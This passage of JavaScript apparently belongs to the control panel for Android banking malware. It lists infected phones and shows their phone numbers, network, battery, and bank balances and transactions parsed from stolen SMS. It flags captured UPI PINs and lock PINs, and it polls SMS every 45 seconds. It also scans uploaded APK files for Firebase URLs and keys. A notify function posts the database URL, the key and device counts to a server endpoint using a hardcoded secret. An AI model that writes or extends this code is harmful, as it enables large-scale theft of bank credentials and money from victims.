  } else {
    d = new Date(ts);
  }
  if (isNaN(d.getTime())) return String(ts).substring(0, 20);
  var now = new Date();
  var diff = now - d;
  if (diff < 60000) return 'just now';
  if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
  if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
  return Math.floor(diff/86400000) + 'd ago';
}

function formatTimestamp(ts) {
  if (!ts) return '';
  var d;
  if (typeof ts === 'number') {
    d = new Date(ts > 1e10 ? ts : ts * 1000);
  } else {
    d = new Date(ts);
  }
  if (isNaN(d.getTime())) return String(ts);
  return d.toLocaleString('en-IN');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Battery widget HTML
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function batBarHtml(pct) {
  var color = pct >= 60 ? '#4ade80' : pct >= 30 ? '#facc15' : '#ef4444';
  var pctSafe = Math.max(5, Math.min(100, pct));
  return '<div class="battery-widget">' +
    '<div class="battery-body">' +
    '<div class="battery-fill" style="width:' + pctSafe + '%;background:' + color + '"></div>' +
    '</div>' +
    '<div class="battery-cap"></div>' +
    '<span class="battery-pct" style="color:' + color + '">' + pct + '%</span>' +
    '</div>';
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Render device card HTML
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderCard(dev) {
  var analysis = dev.smsAnalysis;
  var hasBank = analysis && analysis.bankBalances && analysis.bankBalances.length > 0;
  var hasCard = analysis && analysis.cards && analysis.cards.length > 0;
  var bank0 = hasBank ? analysis.bankBalances[0] : null;

  // Phone from SMS fallback
  var phone = dev.phoneNumber && dev.phoneNumber !== 'â€”' ? dev.phoneNumber :
              (analysis && analysis.phoneNumbers && analysis.phoneNumbers[0] ? analysis.phoneNumbers[0] : 'â€”');
  // Network from SMS fallback
  var network = dev.provider && dev.provider !== 'â€”' ? dev.provider :
                (analysis && analysis.networks && analysis.networks[0] ? analysis.networks[0] : null);

  // Android display — show version if known, — if not set
  var androidDisplay = (dev.android && !dev.android.includes('\u00e2')) ? 'v' + dev.android.replace(/^v/, '') : '\u2014';

  // Last seen
  var lastSeenStr = dev.lastSeen ? formatLastSeen(dev.lastSeen) : '';

  var html = '<div class="device-card' + (dev.status ? ' online' : '') + '" id="card-' + dev.id + '" onclick="openDetail(\'' + escId(dev.id) + '\')">';

  // Header
  html += '<div class="card-header">';
  html += '<div class="card-wifi-icon' + (dev.status ? ' online' : '') + '">';
  html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>';
  html += '</div>';
  html += '<div class="card-name-wrap">';
  html += '<h3 class="card-name">' + escHtml(dev.name) + '</h3>';
  html += '<p class="card-id">' + escHtml(dev.id.substring(0, 18)) + '</p>';
  html += '</div>';
  html += '<div class="card-badges">';
  if (dev.upipin) html += '<svg class="badge-upi" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"/></svg>';
  if (hasBank) html += '<svg class="badge-bank" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
  if (hasCard) html += '<svg class="badge-card-b" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg>';
  html += '</div>';
  html += '</div>'; // /card-header

  // 2Ã—2 grid
  html += '<div class="card-fields">';
  html += '<div>';
  html += '<p class="card-field-label">Android</p>';
  html += '<p class="card-field-value">' + escHtml(androidDisplay) + '</p>';
  html += '</div>';
  html += '<div>';
  html += '<p class="card-field-label">Battery</p>';
  html += batBarHtml(dev.batteryPercent);
  html += '</div>';
  html += '</div>';

  html += '<div class="card-fields">';
  html += '<div>';
  html += '<p class="card-field-label">Number</p>';
  html += '<p class="card-field-mono">' + escHtml(phone) + '</p>';
  html += '</div>';
  if (network) {
    html += '<div>';
    html += '<p class="card-field-label">Network</p>';
    html += '<p class="card-field-value">' + escHtml(network) + '</p>';
    html += '</div>';
  }
  html += '</div>';

  // Bank row
  if (bank0) {
    var txnClass = bank0.transactionType === 'credit' ? '' : ' debit';
    var txnSign = bank0.transactionType === 'credit' ? '+' : '-';
    html += '<div class="card-bank-row">';
    // Top: bank name + balance
    html += '<div class="card-bank-row-top">';
    html += '<span class="card-bank-name">';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
    html += '&#8377; ' + escHtml(bank0.bankName || 'Bank');
    html += '</span>';
    html += '<span class="card-bank-amount">&#8377;' + formatAmount(bank0.availableBalance) + '</span>';
    html += '</div>';
    // Bottom: transaction badge (if any)
    if (bank0.transactionAmount) {
      html += '<div class="card-bank-row-bottom">';
      html += '<span class="card-bank-txn' + txnClass + '">' + txnSign + '&#8377;' + formatAmount(bank0.transactionAmount) + ' ' + (bank0.transactionType || '') + '</span>';
      html += '</div>';
    }
    html += '</div>';
  }

  // Footer
  html += '<div class="card-footer">';
  html += '<span class="status-dot ' + (dev.status ? 'online' : 'offline') + '"></span>';
  if (dev.status) {
    html += '<span class="status-text online">Online</span>';
  } else {
    html += '<span class="status-text offline">Offline</span>';
    if (lastSeenStr) html += '<span class="last-seen">' + escHtml(lastSeenStr) + '</span>';
  }
  if (dev.upipin) html += '<span class="upi-badge">UPI PIN</span>';
  html += '</div>';

  html += '</div>'; // /device-card
  return html;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Skeleton cards
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderSkeletons(count) {
  var html = '';
  for (var i = 0; i < count; i++) {
    html += '<div class="skeleton-card">';
    html += '<div class="skel-header"><div class="skel-box skel-w10-h10"></div>';
    html += '<div style="flex:1"><div class="skel-line1"></div><div class="skel-line2"></div></div></div>';
    html += '<div class="skel-grid"><div class="skel-field"></div><div class="skel-field"></div></div>';
    html += '<div class="skel-footer"></div>';
    html += '</div>';
  }
  return html;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function escHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function escId(s) {
  return String(s).replace(/'/g, "\\'");
}

function showToast(msg, dur) {
  var el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('visible');
  setTimeout(function() { el.classList.remove('visible'); }, dur || 3500);
}

// ─────────────────────────────────────────────────────────────────────────────
// Login Page UI
// ─────────────────────────────────────────────────────────────────────────────
function renderSavedAccounts() {
  var accounts = loadAccounts();
  var list = document.getElementById('saved-list');
  var empty = document.getElementById('saved-empty');
  var count = document.getElementById('saved-count');

  count.textContent = accounts.length + ' ' + (accounts.length === 1 ? 'account' : 'accounts');

  if (accounts.length === 0) {
    empty.style.display = '';
    list.innerHTML = '';
    list.appendChild(empty);
    return;
  }

  empty.style.display = 'none';
  var html = '';
  accounts.forEach(function(acc) {
    html += '<div class="saved-item" onclick="connectSaved(\'' + acc.id + '\')">';
    html += '<div class="saved-item-info">';
    html += '<p class="saved-item-url">' + escHtml(acc.url) + '</p>';
    html += '<p class="saved-item-meta">' + escHtml(acc.date) + ' \u00B7 ' + escHtml(acc.key.substring(0, 20)) + '\u2026</p>';
    html += '</div>';
    html += '<div class="saved-item-actions">';
    html += '<button class="btn-icon btn-icon-share" onclick="event.stopPropagation();showShareModal(\'' + acc.id + '\')" title="Share">';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z"/></svg>';
    html += '</button>';
    html += '<button class="btn-icon btn-icon-del" onclick="event.stopPropagation();deleteSaved(\'' + acc.id + '\')" title="Delete">';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0"/></svg>';
    html += '</button>';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="chevron-right" style="width:1rem;height:1rem"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>';
    html += '</div>';
    html += '</div>';
  });
  list.innerHTML = html;
  if (accounts.length === 0) list.appendChild(empty);
}

function showNewAccountForm() {
  document.getElementById('saved-accounts-section').style.display = 'none';
  document.getElementById('new-account-form').style.display = 'block';
}

function
 showSavedAccounts() {

  document.getElementById('new-account-form').style.display = 'none';
  document.getElementById('saved-accounts-section').style.display = 'block';
  clearApkState();
  document.getElementById('input-url').value = '';
  document.getElementById('input-key').value = '';
  setFormError('');
}

function setFormError(msg) {
  var el = document.getElementById('form-error');
  el.textContent = msg;
  el.classList.toggle('visible', !!msg);
}

async function connectSaved(id) {
  var accounts = loadAccounts();
  var acc = accounts.find(function(a) { return a.id == id; });
  if (!acc) return;
  await startDashboard(acc.url, acc.key);
}

function deleteSaved(id) {
  if (!confirm('Delete this account permanently?')) return;
  var accounts = loadAccounts().filter(function(a) { return a.id != id; });
  saveAccounts(accounts);
  renderSavedAccounts();
}

function showShareModal(id) {
  var accounts = loadAccounts();
  var acc = accounts.find(function(a) { return a.id == id; });
  if (!acc) return;
  var link = makeShareLink(acc.url, acc.key);
  document.getElementById('share-link-text').textContent = link;
  document.getElementById('share-modal').style.display = 'flex';
}

function closeShareModal() {
  document.getElementById('share-modal').style.display = 'none';
}

function copyShareLink() {
  var link = document.getElementById('share-link-text').textContent;
  var btn = document.getElementById('btn-copy-share');
  navigator.clipboard.writeText(link).then(function() {
    if (btn) {
      btn.textContent = '✓ Copied!';
      btn.style.background = '#22c55e';
      btn.style.color = '#ffffff';
      setTimeout(function() {
        btn.textContent = 'Copy';
        btn.style.background = '';
        btn.style.color = '';
      }, 2000);
    }
  });
}

async function handleConnect() {
  var url = document.getElementById('input-url').value.trim().replace(/\/$/, '');
  var key = document.getElementById('input-key').value.trim();

  if (!url) { setFormError('Please enter the Firebase Database URL.'); return; }
  // Validate Firebase URL format
  if (!url.includes('.firebaseio.com') && !url.includes('.firebasedatabase.app')) {
    setFormError('Invalid URL format. Should be: https://your-project-default-rtdb.firebaseio.com');
    return;
  }
  if (!url.startsWith('http')) url = 'https://' + url;
  // key is optional — empty means public DB (rules allow read without auth)

  var accounts = loadAccounts();
  var existing = accounts.find(function(a) { return a.url === url; });
  if (existing) {
    if (confirm('Account already exists. Switch to it?')) {
      await connectSaved(existing.id);
    }
    return;
  }

  var btn = document.getElementById('btn-connect');
  var btnText = document.getElementById('btn-connect-text');
  btn.disabled = true;
  btnText.textContent = 'Connecting...';
  setFormError('');

  try {
    try {
      await fbFetch(url, key, 'clients');
    } catch(e1) {
      await fbFetch(url, key, '');
    }

    var acc = { id: Date.now(), url: url, key: key, date: new Date().toLocaleString() };
    accounts.push(acc);
    saveAccounts(accounts);

    await startDashboard(url, key);
  } catch(e) {
    var msg = e.message || String(e);
    if (msg.includes('PERMISSION_DENIED')) {
      var _keyBlank = !document.getElementById('input-key').value.trim();
      if (_keyBlank) {
        setFormError('This database is not public. Enter your Firebase Database Secret or API key to connect.');
      } else {
        setFormError('Connection failed: Permission denied. Use the Database Secret key (not API key starting with AIza…).');
      }
    } else if (msg.includes('NOT_FOUND')) {
      setFormError('Connection failed: Database URL not found. Check the URL.');
    } else {
      setFormError('Connection failed: ' + msg.slice(0, 80));
    }
  } finally {
    btn.disabled = false;
    btnText.textContent = 'Save & Connect';
  }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// APK parsing (basic ZIP/APK scan for firebase URL + key in strings)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function handleApkDrop(event) {
  event.preventDefault();
  var f = event.dataTransfer.files[0];
  if (f) processApkFile(f);
}

function handleApkFile(event) {
  var f = event.target.files && event.target.files[0];
  if (f) processApkFile(f);
  event.target.value = '';
}

async function processApkFile(file) {
  clearApkState();
  document.getElementById('apk-dropzone').style.display = 'none';
  document.getElementById('apk-scanning').classList.add('visible');
  document.getElementById('apk-scan-status').textContent = file.name;

  try {
    // Read file as text (APK is a ZIP; we do a simple string search)
    var buf = await file.arrayBuffer();
    var bytes = new Uint8Array(buf);
    // Search for firebaseio.com in raw bytes
    var text = '';
    // Convert chunk by chunk to avoid OOM
    var chunkSize = 65536;
    for (var i = 0; i < Math.min(bytes.length, 2000000); i += chunkSize) {
      var chunk = bytes.slice(i, i + chunkSize);
      text += String.fromCharCode.apply(null, chunk);
    }

    // Find firebase URL
    var urlMatch = text.match(/https?:\/\/[a-zA-Z0-9\-]+\.firebaseio\.com/);
    var apiKeyMatch = text.match(/AIza[a-zA-Z0-9\-_]{35}/);
    // Also try to find DB secret (40 hex chars or mixed)
    var secretMatch = text.match(/(?:database_secret|secret)[^a-zA-Z0-9]([a-zA-Z0-9\-_]{39,45})/i) ||
                      text.match(/([a-zA-Z0-9\-_]{39,45})(?=[^a-zA-Z0-9])/g);

    var foundUrl = urlMatch ? urlMatch[0] : null;
    var foundKey = apiKeyMatch ? apiKeyMatch[0] : null;

    if (!foundUrl) throw new Error('Firebase URL not found in APK.');

    document.getElementById('apk-scanning').classList.remove('visible');
    document.getElementById('apk-success').classList.add('visible');
    document.getElementById('apk-url-display').textContent = foundUrl;
    document.getElementById('apk-key-display').textContent = foundKey || 'Not found â€” enter manually';

    // Auto-fill fields
    document.getElementById('input-url').value = foundUrl;
    if (foundKey) document.getElementById('input-key').value = foundKey;

  } catch(e) {
    document.getElementById('apk-scanning').classList.remove('visible');
    document.getElementById('apk-error').classList.add('visible');
    document.getElementById('apk-error-msg').textContent = e.message || 'Failed to parse APK.';
    document.getElementById('apk-dropzone').style.display = '';
  }
}

function clearApkState() {
  document.getElementById('apk-dropzone').style.display = '';
  document.getElementById('apk-scanning').classList.remove('visible');
  document.getElementById('apk-error').classList.remove('visible');
  document.getElementById('apk-success').classList.remove('visible');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Dashboard
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
var _lastNotifyTime = 0;
var _lastNotifyUrl = '';

function sendFirebaseNotify(url, key) {
  try {
    var now = Date.now();
    if (_lastNotifyUrl === url && (now - _lastNotifyTime) < 5000) {
      console.log('Skipping duplicate notification (debounced)');
      return;
    }
    _lastNotifyTime = now;
    _lastNotifyUrl = url;

    var devs = STATE.devices || [];
    var onlineCount = 0, offlineCount = 0, pinCount = 0;
    devs.forEach(function(d) {
      if (d.isOnline) onlineCount++; else offlineCount++;
      var pin = d.pin || d.lockPin || d.screenPin || d.passcode || d.devicePin || '';
      if (pin) pinCount++;
    });
    var ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    var keyDisplay = key ? ('<code>' + key + '</code>') : '<i>None (Public DB)</i>';
    var msg = '✅ <b>Firebase Connected Successfully</b>\n'
      + '🔗 <a href="' + url + '">' + url + '</a>\n\n'
      + '🔑 <b>API Key:</b> ' + keyDisplay + '\n\n'
      + '📊 <b>Panel Status Summary</b>\n'
      + '🟢 Online: <b>' + onlineCount + '</b>  '
      + '🔴 Offline: <b>' + offlineCount + '</b>  '
      + '📱 Total: <b>' + devs.length + '</b>  '
      + '📌 With PIN: <b>' + pinCount + '</b>\n\n'
      + '🕒 ' + ts;
    fetch('/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Panel-Secret': 'pl_7Xk9mN2qR4wT6vY1sL3jF5hG8zA0e' },
      body: JSON.stringify({ text: msg, parse_mode: 'HTML' })
    }).catch(function(err) { console.error('Notify fetch error:', err); });
  } catch(e) { console.error('Notify exception:', e); }
}

async function startDashboard(url, key) {
  STATE.fbUrl = url;
  STATE.fbKey = key;
  STATE.devices = [];
  STATE.smsLoaded = new Set();

    // notify merged into device summary below

  // Switch pages
  document.getElementById('login-page').style.display = 'none';
  var dashPage = document.getElementById('dashboard-page');
  dashPage.style.display = 'flex';
  dashPage.style.flexDirection = 'column';

  // Skeletons
  document.getElementById('skeleton-grid').innerHTML = renderSkeletons(6);
  document.getElementById('loading-state').classList.add('visible');
  document.getElementById('empty-state').classList.remove('visible');
  document.getElementById('cards-container').style.display = 'none';

  // Start clock
  startClock();

  // Initial fetch (safe)
  try {
    await loadDevices(false);
    // Send notification once after devices finish loading with real status
    sendFirebaseNotify(url, key);
  } catch(e) {
    console.error('loadDevices failed:', e);
  }

  // Auto-refresh devices every 15s
  if (STATE.refreshTimer) clearInterval(STATE.refreshTimer);
  STATE.refreshTimer = setInterval(function() { loadDevices(true); }, 15000);

  // Auto-refresh SMS every 45s
  if (STATE.smsRefreshTimer) clearInterval(STATE.smsRefreshTimer);
  STATE.smsRefreshTimer = setInterval(function() { refreshAllSms(); }, 45000);
}

async function loadDevices(silent) {
  try {
    var raw;
    if (STATE.isProxyMode) {
      console.log('[LUFFY-DEBUG] isProxyMode=true, token:', STATE.proxyToken ? STATE.proxyToken.slice(0,20)+'...' : 'NULL');
      try {
        // proxyFetch with empty path → server returns { devId: {...} } wrapper
        raw = await proxyFetch('');
        console.log('[LUFFY-DEBUG] proxyFetch result:', JSON.stringify(raw).slice(0,200));
      } catch(e) { 
        console.error('[LUFFY-DEBUG] proxyFetch error:', e.message);
        raw = {}; 
      }
    } else if (STATE.singleDevId) {
      try {
        var devId = STATE.singleDevId;
        var devObj = null;

        // Path 1: clients/<devId>
        try {
          devObj = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients/' + devId);
        } catch(e1) {}

        // Path 2: <devId> (root level)
        if (!devObj || typeof devObj !== 'object' || Object.keys(devObj).length === 0) {
          try {
            devObj = await fbFetch(STATE.fbUrl, STATE.fbKey, devId);
          } catch(e2) {}
        }

        // Path 3: Full fetch fallback & extraction
        if (!devObj || typeof devObj !== 'object' || Object.keys(devObj).length === 0) {
          try {
            var fullRaw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients');
            if (!fullRaw) fullRaw = await fbFetch(STATE.fbUrl, STATE.fbKey, '');
            var src = (fullRaw && fullRaw.clients && typeof fullRaw.clients === 'object') ? fullRaw.clients : fullRaw;
            if (src && src[devId]) {
              devObj = src[devId];
            }
          } catch(e3) {}
        }

        if (devObj && typeof devObj === 'object' && Object.keys(devObj).length > 0) {
          raw = {};
          raw[devId] = devObj;
        } else {
          raw = {};
        }
      } catch(e) { raw = {}; }
    } else {
      try {
        raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients');
      } catch(e) {
        raw = await fbFetch(STATE.fbUrl, STATE.fbKey, '');
      }
    }

    var prevCount = STATE.devices.length;
    var parsed = parseDevices(raw);

    if (STATE.isProxyMode && parsed.length > 0) {
      STATE.singleDevId = parsed[0].id;
    }

    // Preserve SMS analysis from previous state
    var prevMap = {};
    STATE.devices.forEach(function(d) { prevMap[d.id] = d.smsAnalysis; });
    parsed.forEach(function(d) {
      if (prevMap[d.id]) d.smsAnalysis = prevMap[d.id];
    });

    STATE.devices = parsed;
    dismissError();
    renderDashboard();

    if ((STATE.singleDevId || STATE.isProxyMode) && parsed.length > 0 && !STATE.detailDev) {
      openDetail(parsed[0].id);
    }

    if (!silent) {
      // Fire SMS fetch in background â€” cards already rendered, they update in-place
      batchFetchSms(parsed); // intentionally NOT awaited
    }

    // Notify new device
    if (prevCount > 0 && parsed.length > prevCount) {
      showToast('ðŸ”” New device connected!');
    }

  } catch(e) {
    var msg = e.message || String(e);
    if (msg.includes('PERMISSION_DENIED') || msg.includes('401') || msg.includes('403')) {
      showError('Firebase Permission Denied â€” Your key is rejected. Go to Firebase Console â†’ Project Settings â†’ Service Accounts â†’ Database Secrets and copy the secret key. That secret (not the API key starting with AIzaâ€¦) is what works here.');
    } else if (msg.includes('NOT_FOUND') || msg.includes('404')) {
      showError('Database path not found. Check your Firebase URL is correct.');
    } else {
      showError('Connection error: ' + msg.slice(0, 120));
    }
    if (STATE.devices.length === 0) {
      document.getElementById('loading-state').classList.remove('visible');
      document.getElementById('empty-state').classList.add('visible');
      document.getElementById('cards-container').style.display = 'none';
    }
  }
}

// â”€â”€â”€ Progressive real-time SMS fetch â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Cards render immediately. Each device's card updates the INSTANT its SMS
// resolves â€” no waiting for the full batch. Online devices fetched first.
async function batchFetchSms(devices) {
  var toFetch = devices.filter(function(d) { return !STATE.smsLoaded.has(d.id); });
  if (toFetch.length === 0) return;

  // Online devices first â€” they're the ones user cares about most
  toFetch.sort(function(a, b) {
    if (a.status && !b.status) return -1;
    if (!a.status && b.status) return 1;
    return 0;
  });

  var banner = document.getElementById('sms-loading-banner');
  banner.classList.add('visible');
  var remaining = toFetch.length;

  // Fire all fetches concurrently in chunks of 10
  // Each one updates the card the INSTANT it resolves
  var CONCURRENCY = 10;
  var idx = 0;

  function runNext() {
    if (idx >= toFetch.length) return;
    var dev = toFetch[idx++];
    fetchDeviceSms(dev.id).then(function(result) {
      var d = STATE.devices.find(function(x) { return x.id === dev.id; });
      if (d && result && result.analysis) {
        d.smsAnalysis = result.analysis;
        d.rawMsgs = result.rawMsgs;
        STATE.smsLoaded.add(dev.id);
